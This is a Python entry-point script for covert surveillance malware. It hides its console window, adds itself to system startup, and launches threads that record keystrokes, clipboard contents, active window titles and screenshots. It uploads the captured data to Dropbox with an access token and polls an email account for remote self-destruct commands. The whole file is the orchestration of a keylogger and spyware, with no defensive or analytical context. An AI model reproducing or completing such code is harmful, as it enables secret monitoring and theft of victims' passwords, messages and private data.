import threading
from config import *
from stealth import hide_console, add_to_startup
from logger_setup import setup_loggers
from monitor.keylogger import log_keystrokes
from monitor.clipboard import log_clipboard
from monitor.window import log_window_title
from monitor.screenshot import capture_screenshot
from exfil.dropbox_upload import periodic_dropbox_uploader
from exfil.email_check import check_emails
from self_destruct import initiate_self_destruct
from pynput import keyboard

if __name__ == "__main__":
    hide_console()
    setup_loggers()
    add_to_startup()
    running = threading.Event()
    running.set()
    tasks = [
        threading.Thread(target=log_clipboard, args=(running,)),
        threading.Thread(target=log_window_title, args=(running,)),
        threading.Thread(target=capture_screenshot, args=(running,)),
        threading.Thread(target=lambda: keyboard.Listener(on_press=log_keystrokes).join()),
        threading.Thread(target=check_emails, args=(running, EMAIL_USER, EMAIL_PASS, SELF_DESTRUCT_COMMANDS, lambda: initiate_self_destruct(running), EMAIL_CHECK_INTERVAL)),
        threading.Thread(target=periodic_dropbox_uploader, args=(running, DROPBOX_ACCESS_TOKEN))
    ]
    for task in tasks:
        task.daemon = True
        task.start()
    for task in tasks:
        task.join()
